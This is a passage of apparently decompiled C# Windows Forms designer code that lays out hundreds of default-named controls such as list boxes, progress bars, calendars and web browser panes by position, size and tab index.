			this.CheckedListBox25.TabIndex = 328;
			this.ListBox25.FormattingEnabled = true;
			this.ListBox25.Location = new Point(689, 102);
			this.ListBox25.Name = "ListBox25";
			this.ListBox25.Size = new Size(49, 69);
			this.ListBox25.TabIndex = 327;
			this.DateTimePicker18.Location = new Point(639, 14);
			this.DateTimePicker18.Name = "DateTimePicker18";
			this.DateTimePicker18.Size = new Size(52, 20);
			this.DateTimePicker18.TabIndex = 326;
			this.ListBox26.FormattingEnabled = true;
			this.ListBox26.Location = new Point(707, 33);
			this.ListBox26.Name = "ListBox26";
			this.ListBox26.Size = new Size(47, 4);
			this.ListBox26.TabIndex = 325;
			this.Label9.AutoSize = true;
			this.Label9.Location = new Point(494, 206);
			this.Label9.Name = "Label9";
			this.Label9.Size = new Size(39, 13);
			this.Label9.TabIndex = 324;
			this.Label9.Text = "Label9";
			this.MaskedTextBox17.Location = new Point(352, 151);
			this.MaskedTextBox17.Name = "MaskedTextBox17";
			this.MaskedTextBox17.Size = new Size(83, 20);
			this.MaskedTextBox17.TabIndex = 323;
			this.RadioButton17.AutoSize = true;
			this.RadioButton17.Location = new Point(479, 173);
			this.RadioButton17.Name = "RadioButton17";
			this.RadioButton17.Size = new Size(96, 17);
			this.RadioButton17.TabIndex = 322;
			this.RadioButton17.TabStop = true;
			this.RadioButton17.Text = "RadioButton17";
			this.RadioButton17.UseVisualStyleBackColor = true;
			this.PictureBox17.Location = new Point(321, 253);
			this.PictureBox17.Name = "PictureBox17";
			this.PictureBox17.Size = new Size(20, 20);
			this.PictureBox17.TabIndex = 321;
			this.PictureBox17.TabStop = false;
			this.MaskedTextBox18.Location = new Point(341, 206);
			this.MaskedTextBox18.Name = "MaskedTextBox18";
			this.MaskedTextBox18.Size = new Size(141, 20);
			this.MaskedTextBox18.TabIndex = 320;
			this.WebBrowser9.Location = new Point(482, 136);
			this.WebBrowser9.MinimumSize = new Size(20, 20);
			this.WebBrowser9.Name = "WebBrowser9";
			this.WebBrowser9.Size = new Size(69, 20);
			this.WebBrowser9.TabIndex = 319;
			this.TreeView9.Location = new Point(229, 182);
			this.TreeView9.Name = "TreeView9";
			this.TreeView9.Size = new Size(183, 112);
			this.TreeView9.TabIndex = 318;
			this.PictureBox18.Location = new Point(526, 173);
			this.PictureBox18.Name = "PictureBox18";
			this.PictureBox18.Size = new Size(166, 43);
			this.PictureBox18.TabIndex = 317;
			this.PictureBox18.TabStop = false;
			this.NumericUpDown9.Location = new Point(140, 269);
			this.NumericUpDown9.Name = "NumericUpDown9";
			this.NumericUpDown9.Size = new Size(78, 20);
			this.NumericUpDown9.TabIndex = 316;
			this.ProgressBar35.Location = new Point(60, 231);
			this.ProgressBar35.Name = "ProgressBar35";
			this.ProgressBar35.Size = new Size(74, 44);
			this.ProgressBar35.TabIndex = 315;
			this.RadioButton18.AutoSize = true;
			this.RadioButton18.Location = new Point(85, 303);
			this.RadioButton18.Name = "RadioButton18";
			this.RadioButton18.Size = new Size(96, 17);
			this.RadioButton18.TabIndex = 314;
			this.RadioButton18.TabStop = true;
			this.RadioButton18.Text = "RadioButton18";
			this.RadioButton18.UseVisualStyleBackColor = true;
			this.LinkLabel25.AutoSize = true;
			this.LinkLabel25.Location = new Point(47, 232);
			this.LinkLabel25.Name = "LinkLabel25";
			this.LinkLabel25.Size = new Size(65, 13);
			this.LinkLabel25.TabIndex = 313;
			this.LinkLabel25.TabStop = true;
			this.LinkLabel25.Text = "LinkLabel25";
			this.CheckBox17.AutoSize = true;
			this.CheckBox17.Location = new Point(183, 83);
			this.CheckBox17.Name = "CheckBox17";
			this.CheckBox17.Size = new Size(87, 17);
			this.CheckBox17.TabIndex = 312;
			this.CheckBox17.Text = "CheckBox17";
			this.CheckBox17.UseVisualStyleBackColor = true;
			this.ComboBox17.FormattingEnabled = true;
			this.ComboBox17.Location = new Point(174, 44);
			this.ComboBox17.Name = "ComboBox17";
			this.ComboBox17.Size = new Size(115, 21);
			this.ComboBox17.TabIndex = 311;
			this.Button17.Location = new Point(551, 151);
			this.Button17.Name = "Button17";
			this.Button17.Size = new Size(75, 23);
			this.Button17.TabIndex = 310;
			this.Button17.Text = "Button17";
			this.Button17.UseVisualStyleBackColor = true;
			this.CheckedListBox26.FormattingEnabled = true;
			this.CheckedListBox26.Location = new Point(50, 164);
			this.CheckedListBox26.Name = "CheckedListBox26";
			this.CheckedListBox26.Size = new Size(222, 4);
			this.CheckedListBox26.TabIndex = 309;
			this.ComboBox18.FormattingEnabled = true;
			this.ComboBox18.Location = new Point(172, 75);
			this.ComboBox18.Name = "ComboBox18";
			this.ComboBox18.Size = new Size(101, 21);
			this.ComboBox18.TabIndex = 308;
			this.MonthCalendar18.Location = new Point(108, 114);
			this.MonthCalendar18.Name = "MonthCalendar18";
			this.MonthCalendar18.TabIndex = 307;
			this.MonthCalendar19.Location = new Point(435, 237);
			this.MonthCalendar19.Name = "MonthCalendar19";
			this.MonthCalendar19.TabIndex = 306;
			this.LinkLabel26.AutoSize = true;
			this.LinkLabel26.Location = new Point(115, 45);
			this.LinkLabel26.Name = "LinkLabel26";
			this.LinkLabel26.Size = new Size(65, 13);
			this.LinkLabel26.TabIndex = 305;
			this.LinkLabel26.TabStop = true;
			this.LinkLabel26.Text = "LinkLabel26";
			this.ProgressBar36.Location = new Point(86, 133);
			this.ProgressBar36.Name = "ProgressBar36";
			this.ProgressBar36.Size = new Size(93, 107);
			this.ProgressBar36.TabIndex = 304;
			this.LinkLabel27.AutoSize = true;
			this.LinkLabel27.Location = new Point(466, 219);
			this.LinkLabel27.Name = "LinkLabel27";
			this.LinkLabel27.Size = new Size(65, 13);
			this.LinkLabel27.TabIndex = 303;
			this.LinkLabel27.TabStop = true;
			this.LinkLabel27.Text = "LinkLabel27";
			this.ListBox27.FormattingEnabled = true;
			this.ListBox27.Location = new Point(273, 284);
			this.ListBox27.Name = "ListBox27";
			this.ListBox27.Size = new Size(165, 69);
			this.ListBox27.TabIndex = 302;
			this.CheckBox18.AutoSize = true;
			this.CheckBox18.Location = new Point(163, 253);
			this.CheckBox18.Name = "CheckBox18";
			this.CheckBox18.Size = new Size(87, 17);
			this.CheckBox18.TabIndex = 301;
			this.CheckBox18.Text = "CheckBox18";
			this.CheckBox18.UseVisualStyleBackColor = true;
			this.CheckedListBox27.FormattingEnabled = true;
			this.CheckedListBox27.Location = new Point(324, 88);
			this.CheckedListBox27.Name = "CheckedListBox27";
			this.CheckedListBox27.Size = new Size(303, 49);
			this.CheckedListBox27.TabIndex = 300;
			this.Button18.Location = new Point(242, 133);
			this.Button18.Name = "Button18";
			this.Button18.Size = new Size(156, 50);
			this.Button18.TabIndex = 299;
			this.Button18.Text = "Button18";
			this.Button18.UseVisualStyleBackColor = true;
			this.ProgressBar37.Location = new Point(43, 52);
			this.ProgressBar37.Name = "ProgressBar37";
			this.ProgressBar37.Size = new Size(57, 54);
			this.ProgressBar37.TabIndex = 298;
			this.ProgressBar38.Location = new Point(689, 235);
			this.ProgressBar38.Name = "ProgressBar38";
			this.ProgressBar38.Size = new Size(40, 96);
			this.ProgressBar38.TabIndex = 297;
			this.DateTimePicker19.Location = new Point(634, 185);
			this.DateTimePicker19.Name = "DateTimePicker19";
			this.DateTimePicker19.Size = new Size(85, 20);
			this.DateTimePicker19.TabIndex = 296;
			this.CheckedListBox28.FormattingEnabled = true;
			this.CheckedListBox28.Location = new Point(409, 17);
			this.CheckedListBox28.Name = "CheckedListBox28";
			this.CheckedListBox28.Size = new Size(151, 49);
			this.CheckedListBox28.TabIndex = 295;
			this.ListBox28.FormattingEnabled = true;
			this.ListBox28.Location = new Point(681, 94);
			this.ListBox28.Name = "ListBox28";
			this.ListBox28.Size = new Size(49, 69);
			this.ListBox28.TabIndex = 294;
			this.DateTimePicker20.Location = new Point(631, 6);
			this.DateTimePicker20.Name = "DateTimePicker20";
			this.DateTimePicker20.Size = new Size(52, 20);
			this.DateTimePicker20.TabIndex = 293;
			this.ListBox29.FormattingEnabled = true;
			this.ListBox29.Location = new Point(699, 25);
			this.ListBox29.Name = "ListBox29";
			this.ListBox29.Size = new Size(47, 4);
			this.ListBox29.TabIndex = 292;
			this.Label10.AutoSize = true;
			this.Label10.Location = new Point(486, 198);
			this.Label10.Name = "Label10";
			this.Label10.Size = new Size(45, 13);
			this.Label10.TabIndex = 291;
			this.Label10.Text = "Label10";
			this.MaskedTextBox19.Location = new Point(344, 143);
			this.MaskedTextBox19.Name = "MaskedTextBox19";
			this.MaskedTextBox19.Size = new Size(83, 20);
			this.MaskedTextBox19.TabIndex = 290;
			this.RadioButton19.AutoSize = true;
			this.RadioButton19.Location = new Point(471, 165);
			this.RadioButton19.Name = "RadioButton19";
			this.RadioButton19.Size = new Size(96, 17);
			this.RadioButton19.TabIndex = 289;
			this.RadioButton19.TabStop = true;
			this.RadioButton19.Text = "RadioButton19";
			this.RadioButton19.UseVisualStyleBackColor = true;
			this.PictureBox19.Location = new Point(313, 245);
			this.PictureBox19.Name = "PictureBox19";
			this.PictureBox19.Size = new Size(20, 20);
			this.PictureBox19.TabIndex = 288;
			this.PictureBox19.TabStop = false;
			this.MaskedTextBox20.Location = new Point(333, 198);
			this.MaskedTextBox20.Name = "MaskedTextBox20";
			this.MaskedTextBox20.Size = new Size(141, 20);
			this.MaskedTextBox20.TabIndex = 287;
			this.WebBrowser10.Location = new Point(474, 128);
			this.WebBrowser10.MinimumSize = new Size(20, 20);
			this.WebBrowser10.Name = "WebBrowser10";
			this.WebBrowser10.Size = new Size(69, 20);
			this.WebBrowser10.TabIndex = 286;
			this.TreeView10.Location = new Point(221, 174);
			this.TreeView10.Name = "TreeView10";
			this.TreeView10.Size = new Size(183, 112);
			this.TreeView10.TabIndex = 285;
			this.PictureBox20.Location = new Point(518, 165);
			this.PictureBox20.Name = "PictureBox20";
			this.PictureBox20.Size = new Size(166, 43);
			this.PictureBox20.TabIndex = 284;
			this.PictureBox20.TabStop = false;
			this.NumericUpDown10.Location = new Point(132, 261);
			this.NumericUpDown10.Name = "NumericUpDown10";
			this.NumericUpDown10.Size = new Size(78, 20);
			this.NumericUpDown10.TabIndex = 283;
			this.ProgressBar39.Location = new Point(52, 223);
			this.ProgressBar39.Name = "ProgressBar39";
			this.ProgressBar39.Size = new Size(74, 44);
			this.ProgressBar39.TabIndex = 282;
			this.RadioButton20.AutoSize = true;
			this.RadioButton20.Location = new Point(77, 295);
			this.RadioButton20.Name = "RadioButton20";
			this.RadioButton20.Size = new Size(96, 17);
			this.RadioButton20.TabIndex = 281;
			this.RadioButton20.TabStop = true;
			this.RadioButton20.Text = "RadioButton20";
			this.RadioButton20.UseVisualStyleBackColor = true;
			this.LinkLabel28.AutoSize = true;
			this.LinkLabel28.Location = new Point(39, 224);
			this.LinkLabel28.Name = "LinkLabel28";
			this.LinkLabel28.Size = new Size(65, 13);
			this.LinkLabel28.TabIndex = 280;
			this.LinkLabel28.TabStop = true;
			this.LinkLabel28.Text = "LinkLabel28";
			this.CheckBox19.AutoSize = true;
			this.CheckBox19.Location = new Point(175, 75);
			this.CheckBox19.Name = "CheckBox19";
			this.CheckBox19.Size = new Size(87, 17);
			this.CheckBox19.TabIndex = 279;
			this.CheckBox19.Text = "CheckBox19";
			this.CheckBox19.UseVisualStyleBackColor = true;
			this.ComboBox19.FormattingEnabled = true;
			this.ComboBox19.Location = new Point(166, 36);
			this.ComboBox19.Name = "ComboBox19";
			this.ComboBox19.Size = new Size(115, 21);
			this.ComboBox19.TabIndex = 278;
			this.Button19.Location = new Point(543, 143);
			this.Button19.Name = "Button19";
			this.Button19.Size = new Size(75, 23);
			this.Button19.TabIndex = 277;
			this.Button19.Text = "Button19";
			this.Button19.UseVisualStyleBackColor = true;
			this.CheckedListBox29.FormattingEnabled = true;
			this.CheckedListBox29.Location = new Point(42, 156);
			this.CheckedListBox29.Name = "CheckedListBox29";
			this.CheckedListBox29.Size = new Size(222, 4);
			this.CheckedListBox29.TabIndex = 276;
			this.ComboBox20.FormattingEnabled = true;
			this.ComboBox20.Location = new Point(164, 67);
			this.ComboBox20.Name = "ComboBox20";
			this.ComboBox20.Size = new Size(101, 21);
			this.ComboBox20.TabIndex = 275;
			this.MonthCalendar20.Location = new Point(100, 106);
			this.MonthCalendar20.Name = "MonthCalendar20";
			this.MonthCalendar20.TabIndex = 274;
			this.MonthCalendar21.Location = new Point(427, 229);
			this.MonthCalendar21.Name = "MonthCalendar21";
			this.MonthCalendar21.TabIndex = 273;
			this.LinkLabel29.AutoSize = true;
			this.LinkLabel29.Location = new Point(107, 37);
			this.LinkLabel29.Name = "LinkLabel29";
			this.LinkLabel29.Size = new Size(65, 13);
			this.LinkLabel29.TabIndex = 272;
			this.LinkLabel29.TabStop = true;
			this.LinkLabel29.Text = "LinkLabel29";
			this.ProgressBar40.Location = new Point(78, 125);
			this.ProgressBar40.Name = "ProgressBar40";
			this.ProgressBar40.Size = new Size(93, 107);
			this.ProgressBar40.TabIndex = 271;
			this.LinkLabel30.AutoSize = true;
			this.LinkLabel30.Location = new Point(458, 211);
			this.LinkLabel30.Name = "LinkLabel30";
			this.LinkLabel30.Size = new Size(65, 13);
			this.LinkLabel30.TabIndex = 270;
			this.LinkLabel30.TabStop = true;
			this.LinkLabel30.Text = "LinkLabel30";
			this.ListBox30.FormattingEnabled = true;
			this.ListBox30.Location = new Point(265, 276);
			this.ListBox30.Name = "ListBox30";
			this.ListBox30.Size = new Size(165, 69);
			this.ListBox30.TabIndex = 269;
			this.CheckBox20.AutoSize = true;
			this.CheckBox20.Location = new Point(155, 245);
			this.CheckBox20.Name = "CheckBox20";
			this.CheckBox20.Size = new Size(87, 17);
			this.CheckBox20.TabIndex = 268;
			this.CheckBox20.Text = "CheckBox20";
			this.CheckBox20.UseVisualStyleBackColor = true;
			this.CheckedListBox30.FormattingEnabled = true;
			this.CheckedListBox30.Location = new Point(316, 80);
			this.CheckedListBox30.Name = "CheckedListBox30";
			this.CheckedListBox30.Size = new Size(303, 49);
			this.CheckedListBox30.TabIndex = 267;
			this.Button20.Location = new Point(234, 125);
			this.Button20.Name = "Button20";
			this.Button20.Size = new Size(156, 50);
			this.Button20.TabIndex = 266;
			this.Button20.Text = "Button20";
			this.Button20.UseVisualStyleBackColor = true;
			this.ProgressBar41.Location = new Point(35, 44);
			this.ProgressBar41.Name = "ProgressBar41";
			this.ProgressBar41.Size = new Size(57, 54);
			this.ProgressBar41.TabIndex = 265;
			this.ProgressBar42.Location = new Point(681, 227);
			this.ProgressBar42.Name = "ProgressBar42";
			this.ProgressBar42.Size = new Size(40, 96);
			this.ProgressBar42.TabIndex = 264;
			this.DateTimePicker21.Location = new Point(626, 177);
			this.DateTimePicker21.Name = "DateTimePicker21";
			this.DateTimePicker21.Size = new Size(85, 20);
			this.DateTimePicker21.TabIndex = 263;
			this.CheckedListBox31.FormattingEnabled = true;
			this.CheckedListBox31.Location = new Point(401, 9);
			this.CheckedListBox31.Name = "CheckedListBox31";
			this.CheckedListBox31.Size = new Size(151, 49);
			this.CheckedListBox31.TabIndex = 262;
			this.ListBox31.FormattingEnabled = true;
			this.ListBox31.Location = new Point(673, 86);
			this.ListBox31.Name = "ListBox31";
			this.ListBox31.Size = new Size(49, 69);
			this.ListBox31.TabIndex = 261;
			this.DateTimePicker22.Location = new Point(623, -2);
			this.DateTimePicker22.Name = "DateTimePicker22";
			this.DateTimePicker22.Size = new Size(52, 20);
			this.DateTimePicker22.TabIndex = 260;
			this.ListBox32.FormattingEnabled = true;
			this.ListBox32.Location = new Point(691, 17);
			this.ListBox32.Name = "ListBox32";
			this.ListBox32.Size = new Size(47, 4);
			this.ListBox32.TabIndex = 259;
			this.Label11.AutoSize = true;
			this.Label11.Location = new Point(478, 190);
			this.Label11.Name = "Label11";
			this.Label11.Size = new Size(45, 13);
			this.Label11.TabIndex = 258;
			this.Label11.Text = "Label11";
			this.MaskedTextBox21.Location = new Point(336, 135);
			this.MaskedTextBox21.Name = "MaskedTextBox21";
			this.MaskedTextBox21.Size = new Size(83, 20);
			this.MaskedTextBox21.TabIndex = 257;
			this.RadioButton21.AutoSize = true;
			this.RadioButton21.Location = new Point(463, 157);
			this.RadioButton21.Name = "RadioButton21";
			this.RadioButton21.Size = new Size(96, 17);
			this.RadioButton21.TabIndex = 256;
			this.RadioButton21.TabStop = true;
			this.RadioButton21.Text = "RadioButton21";
			this.RadioButton21.UseVisualStyleBackColor = true;
			this.PictureBox21.Location = new Point(305, 237);
			this.PictureBox21.Name = "PictureBox21";
			this.PictureBox21.Size = new Size(20, 20);
			this.PictureBox21.TabIndex = 255;
			this.PictureBox21.TabStop = false;
			this.MaskedTextBox22.Location = new Point(325, 190);
			this.MaskedTextBox22.Name = "MaskedTextBox22";
			this.MaskedTextBox22.Size = new Size(141, 20);
			this.MaskedTextBox22.TabIndex = 254;
			this.WebBrowser11.Location = new Point(466, 120);
			this.WebBrowser11.MinimumSize = new Size(20, 20);
			this.WebBrowser11.Name = "WebBrowser11";
			this.WebBrowser11.Size = new Size(69, 20);
			this.WebBrowser11.TabIndex = 253;
			this.TreeView11.Location = new Point(213, 166);
			this.TreeView11.Name = "TreeView11";
			this.TreeView11.Size = new Size(183, 112);
			this.TreeView11.TabIndex = 252;
			this.PictureBox22.Location = new Point(510, 157);
			this.PictureBox22.Name = "PictureBox22";
			this.PictureBox22.Size = new Size(166, 43);
			this.PictureBox22.TabIndex = 251;
			this.PictureBox22.TabStop = false;
			this.NumericUpDown11.Location = new Point(124, 253);
			this.NumericUpDown11.Name = "NumericUpDown11";
			this.NumericUpDown11.Size = new Size(78, 20);
			this.NumericUpDown11.TabIndex = 250;
			this.ProgressBar43.Location = new Point(44, 215);
			this.ProgressBar43.Name = "ProgressBar43";
			this.ProgressBar43.Size = new Size(74, 44);
			this.ProgressBar43.TabIndex = 249;
			this.RadioButton22.AutoSize = true;
			this.RadioButton22.Location = new Point(69, 287);
			this.RadioButton22.Name = "RadioButton22";
			this.RadioButton22.Size = new Size(96, 17);
			this.RadioButton22.TabIndex = 248;
			this.RadioButton22.TabStop = true;
			this.RadioButton22.Text = "RadioButton22";
			this.RadioButton22.UseVisualStyleBackColor = true;
			this.LinkLabel31.AutoSize = true;
			this.LinkLabel31.Location = new Point(31, 216);
			this.LinkLabel31.Name = "LinkLabel31";
			this.LinkLabel31.Size = new Size(65, 13);
			this.LinkLabel31.TabIndex = 247;
			this.LinkLabel31.TabStop = true;
			this.LinkLabel31.Text = "LinkLabel31";
			this.CheckBox21.AutoSize = true;
			this.CheckBox21.Location = new Point(167, 67);
			this.CheckBox21.Name = "CheckBox21";
			this.CheckBox21.Size = new Size(87, 17);
			this.CheckBox21.TabIndex = 246;
			this.CheckBox21.Text = "CheckBox21";
			this.CheckBox21.UseVisualStyleBackColor = true;
			this.ComboBox21.FormattingEnabled = true;
			this.ComboBox21.Location = new Point(158, 28);
			this.ComboBox21.Name = "ComboBox21";
			this.ComboBox21.Size = new Size(115, 21);
			this.ComboBox21.TabIndex = 245;
			this.Button21.Location = new Point(535, 135);
			this.Button21.Name = "Button21";
			this.Button21.Size = new Size(75, 23);
			this.Button21.TabIndex = 244;
			this.Button21.Text = "Button21";
			this.Button21.UseVisualStyleBackColor = true;
			this.NotifyIcon2.Text = "NotifyIcon1";
			this.NotifyIcon2.Visible = true;
			this.CheckedListBox32.FormattingEnabled = true;
			this.CheckedListBox32.Location = new Point(34, 148);
			this.CheckedListBox32.Name = "CheckedListBox32";
			this.CheckedListBox32.Size = new Size(222, 4);
			this.CheckedListBox32.TabIndex = 243;
			this.ComboBox22.FormattingEnabled = true;
			this.ComboBox22.Location = new Point(156, 59);
			this.ComboBox22.Name = "ComboBox22";
			this.ComboBox22.Size = new Size(101, 21);
			this.ComboBox22.TabIndex = 242;
			this.MonthCalendar22.Location = new Point(92, 98);
			this.MonthCalendar22.Name = "MonthCalendar22";
			this.MonthCalendar22.TabIndex = 241;
			this.MonthCalendar23.Location = new Point(419, 221);
			this.MonthCalendar23.Name = "MonthCalendar23";
			this.MonthCalendar23.TabIndex = 240;
			this.LinkLabel32.AutoSize = true;
			this.LinkLabel32.Location = new Point(99, 29);
			this.LinkLabel32.Name = "LinkLabel32";
			this.LinkLabel32.Size = new Size(65, 13);
			this.LinkLabel32.TabIndex = 239;
			this.LinkLabel32.TabStop = true;
			this.LinkLabel32.Text = "LinkLabel32";
			this.ProgressBar44.Location = new Point(70, 117);
			this.ProgressBar44.Name = "ProgressBar44";
			this.ProgressBar44.Size = new Size(93, 107);
			this.ProgressBar44.TabIndex = 238;
			this.LinkLabel33.AutoSize = true;
			this.LinkLabel33.Location = new Point(450, 203);
			this.LinkLabel33.Name = "LinkLabel33";
			this.LinkLabel33.Size = new Size(65, 13);
			this.LinkLabel33.TabIndex = 237;
			this.LinkLabel33.TabStop = true;
			this.LinkLabel33.Text = "LinkLabel33";
			this.ListBox33.FormattingEnabled = true;
			this.ListBox33.Location = new Point(257, 268);
			this.ListBox33.Name = "ListBox33";
			this.ListBox33.Size = new Size(165, 69);
			this.ListBox33.TabIndex = 236;
			this.CheckBox22.AutoSize = true;
			this.CheckBox22.Location = new Point(147, 237);
			this.CheckBox22.Name = "CheckBox22";
			this.CheckBox22.Size = new Size(87, 17);
			this.CheckBox22.TabIndex = 235;
			this.CheckBox22.Text = "CheckBox22";
			this.CheckBox22.UseVisualStyleBackColor = true;
			this.CheckedListBox33.FormattingEnabled = true;
			this.CheckedListBox33.Location = new Point(308, 72);
			this.CheckedListBox33.Name = "CheckedListBox33";
			this.CheckedListBox33.Size = new Size(303, 49);
			this.CheckedListBox33.TabIndex = 234;
			this.Button22.Location = new Point(226, 117);
			this.Button22.Name = "Button22";
			this.Button22.Size = new Size(156, 50);
			this.Button22.TabIndex = 233;
			this.Button22.Text = "Button22";
			this.Button22.UseVisualStyleBackColor = true;
			this.ProgressBar45.Location = new Point(35, 17);
			this.ProgressBar45.Name = "ProgressBar45";
			this.ProgressBar45.Size = new Size(57, 54);
			this.ProgressBar45.TabIndex = 232;
			this.ProgressBar46.Location = new Point(681, 200);
			this.ProgressBar46.Name = "ProgressBar46";
			this.ProgressBar46.Size = new Size(40, 96);
			this.ProgressBar46.TabIndex = 231;
			this.DateTimePicker23.Location = new Point(626, 150);
			this.DateTimePicker23.Name = "DateTimePicker23";
			this.DateTimePicker23.Size = new Size(85, 20);
			this.DateTimePicker23.TabIndex = 230;
			this.CheckedListBox34.FormattingEnabled = true;
			this.CheckedListBox34.Location = new Point(401, -18);
			this.CheckedListBox34.Name = "CheckedListBox34";
			this.CheckedListBox34.Size = new Size(151, 49);
			this.CheckedListBox34.TabIndex = 229;
			this.ListBox34.FormattingEnabled = true;
			this.ListBox34.Location = new Point(673, 59);
			this.ListBox34.Name = "ListBox34";
			this.ListBox34.Size = new Size(49, 69);
			this.ListBox34.TabIndex = 228;
			this.DateTimePicker24.Location = new Point(623, -29);
			this.DateTimePicker24.Name = "DateTimePicker24";
			this.DateTimePicker24.Size = new Size(52, 20);
			this.DateTimePicker24.TabIndex = 227;
			this.ListBox35.FormattingEnabled = true;
			this.ListBox35.Location = new Point(691, -10);
			this.ListBox35.Name = "ListBox35";
			this.ListBox35.Size = new Size(47, 4);
			this.ListBox35.TabIndex = 226;
			this.Label12.AutoSize = true;
			this.Label12.Location = new Point(478, 163);
			this.Label12.Name = "Label12";
			this.Label12.Size = new Size(45, 13);
			this.Label12.TabIndex = 225;
			this.Label12.Text = "Label12";
			this.MaskedTextBox23.Location = new Point(336, 108);
			this.MaskedTextBox23.Name = "MaskedTextBox23";
			this.MaskedTextBox23.Size = new Size(83, 20);
			this.MaskedTextBox23.TabIndex = 224;
			this.RadioButton23.AutoSize = true;
			this.RadioButton23.Location = new Point(463, 130);
			this.RadioButton23.Name = "RadioButton23";
			this.RadioButton23.Size = new Size(96, 17);
			this.RadioButton23.TabIndex = 223;
			this.RadioButton23.TabStop = true;
			this.RadioButton23.Text = "RadioButton23";
			this.RadioButton23.UseVisualStyleBackColor = true;
			this.PictureBox23.Location = new Point(305, 210);
			this.PictureBox23.Name = "PictureBox23";
			this.PictureBox23.Size = new Size(20, 20);
			this.PictureBox23.TabIndex = 222;
			this.PictureBox23.TabStop = false;
			this.MaskedTextBox24.Location = new Point(325, 163);
			this.MaskedTextBox24.Name = "MaskedTextBox24";
			this.MaskedTextBox24.Size = new Size(141, 20);
			this.MaskedTextBox24.TabIndex = 221;
			this.WebBrowser12.Location = new Point(466, 93);
			this.WebBrowser12.MinimumSize = new Size(20, 20);
			this.WebBrowser12.Name = "WebBrowser12";
			this.WebBrowser12.Size = new Size(69, 20);
			this.WebBrowser12.TabIndex = 220;
			this.TreeView12.Location = new Point(213, 139);
			this.TreeView12.Name = "TreeView12";
			this.TreeView12.Size = new Size(183, 112);
			this.TreeView12.TabIndex = 219;
			this.PictureBox24.Location = new Point(510, 130);
			this.PictureBox24.Name = "PictureBox24";
			this.PictureBox24.Size = new Size(166, 43);
			this.PictureBox24.TabIndex = 218;
			this.PictureBox24.TabStop = false;
			this.NumericUpDown12.Location = new Point(124, 226);
			this.NumericUpDown12.Name = "NumericUpDown12";
			this.NumericUpDown12.Size = new Size(78, 20);
			this.NumericUpDown12.TabIndex = 217;
			this.ProgressBar47.Location = new Point(44, 188);
			this.ProgressBar47.Name = "ProgressBar47";
			this.ProgressBar47.Size = new Size(74, 44);
			this.ProgressBar47.TabIndex = 216;
			this.RadioButton24.AutoSize = true;
			this.RadioButton24.Location = new Point(69, 260);
			this.RadioButton24.Name = "RadioButton24";
			this.RadioButton24.Size = new Size(96, 17);
			this.RadioButton24.TabIndex = 215;
			this.RadioButton24.TabStop = true;
			this.RadioButton24.Text = "RadioButton24";
			this.RadioButton24.UseVisualStyleBackColor = true;
			this.LinkLabel34.AutoSize = true;
			this.LinkLabel34.Location = new Point(31, 189);
			this.LinkLabel34.Name = "LinkLabel34";
			this.LinkLabel34.Size = new Size(65, 13);
			this.LinkLabel34.TabIndex = 214;
			this.LinkLabel34.TabStop = true;
			this.LinkLabel34.Text = "LinkLabel34";
			this.CheckBox23.AutoSize = true;
			this.CheckBox23.Location = new Point(167, 40);
			this.CheckBox23.Name = "CheckBox23";
			this.CheckBox23.Size = new Size(87, 17);
			this.CheckBox23.TabIndex = 213;
			this.CheckBox23.Text = "CheckBox23";
			this.CheckBox23.UseVisualStyleBackColor = true;
			this.ComboBox23.FormattingEnabled = true;
			this.ComboBox23.Location = new Point(158, 1);
			this.ComboBox23.Name = "ComboBox23";
			this.ComboBox23.Size = new Size(115, 21);
			this.ComboBox23.TabIndex = 212;
			this.Button23.Location = new Point(535, 108);
			this.Button23.Name = "Button23";
			this.Button23.Size = new Size(75, 23);
			this.Button23.TabIndex = 211;
			this.Button23.Text = "Button23";
			this.Button23.UseVisualStyleBackColor = true;
			this.CheckedListBox35.FormattingEnabled = true;
			this.CheckedListBox35.Location = new Point(34, 121);
			this.CheckedListBox35.Name = "CheckedListBox35";
			this.CheckedListBox35.Size = new Size(222, 4);
			this.CheckedListBox35.TabIndex = 210;
			this.ComboBox24.FormattingEnabled = true;
			this.ComboBox24.Location = new Point(156, 32);
			this.ComboBox24.Name = "ComboBox24";
			this.ComboBox24.Size = new Size(101, 21);
			this.ComboBox24.TabIndex = 209;
			this.MonthCalendar24.Location = new Point(92, 71);
			this.MonthCalendar24.Name = "MonthCalendar24";
			this.MonthCalendar24.TabIndex = 208;
			this.MonthCalendar25.Location = new Point(419, 194);
			this.MonthCalendar25.Name = "MonthCalendar25";
			this.MonthCalendar25.TabIndex = 207;
			this.LinkLabel35.AutoSize = true;
			this.LinkLabel35.Location = new Point(99, 2);
			this.LinkLabel35.Name = "LinkLabel35";
			this.LinkLabel35.Size = new Size(65, 13);
			this.LinkLabel35.TabIndex = 206;
			this.LinkLabel35.TabStop = true;
			this.LinkLabel35.Text = "LinkLabel35";
			this.ProgressBar48.Location = new Point(70, 90);
			this.ProgressBar48.Name = "ProgressBar48";
			this.ProgressBar48.Size = new Size(93, 107);
			this.ProgressBar48.TabIndex = 205;
			this.MonthCalendar26.Location = new Point(47, 317);
			this.MonthCalendar26.Name = "MonthCalendar26";
			this.MonthCalendar26.TabIndex = 204;
			this.LinkLabel36.AutoSize = true;
			this.LinkLabel36.Location = new Point(450, 176);
			this.LinkLabel36.Name = "LinkLabel36";
			this.LinkLabel36.Size = new Size(65, 13);
			this.LinkLabel36.TabIndex = 203;
			this.LinkLabel36.TabStop = true;
			this.LinkLabel36.Text = "LinkLabel36";
			this.ListBox36.FormattingEnabled = true;
			this.ListBox36.Location = new Point(257, 241);
			this.ListBox36.Name = "ListBox36";
			this.ListBox36.Size = new Size(165, 69);
			this.ListBox36.TabIndex = 202;
			this.CheckBox24.AutoSize = true;
			this.CheckBox24.Location = new Point(147, 210);
			this.CheckBox24.Name = "CheckBox24";
			this.CheckBox24.Size = new Size(87, 17);
			this.CheckBox24.TabIndex = 201;
			this.CheckBox24.Text = "CheckBox24";
			this.CheckBox24.UseVisualStyleBackColor = true;
			this.CheckedListBox36.FormattingEnabled = true;
			this.CheckedListBox36.Location = new Point(308, 45);
			this.CheckedListBox36.Name = "CheckedListBox36";
			this.CheckedListBox36.Size = new Size(303, 49);
			this.CheckedListBox36.TabIndex = 200;
			this.Button24.Location = new Point(226, 90);
			this.Button24.Name = "Button24";
			this.Button24.Size = new Size(156, 50);
			this.Button24.TabIndex = 199;
			this.Button24.Text = "Button24";
			this.Button24.UseVisualStyleBackColor = true;
			this.ProgressBar49.Location = new Point(36, 105);
			this.ProgressBar49.Name = "ProgressBar49";
			this.ProgressBar49.Size = new Size(57, 54);
			this.ProgressBar49.TabIndex = 596;
			this.ProgressBar50.Location = new Point(682, 288);
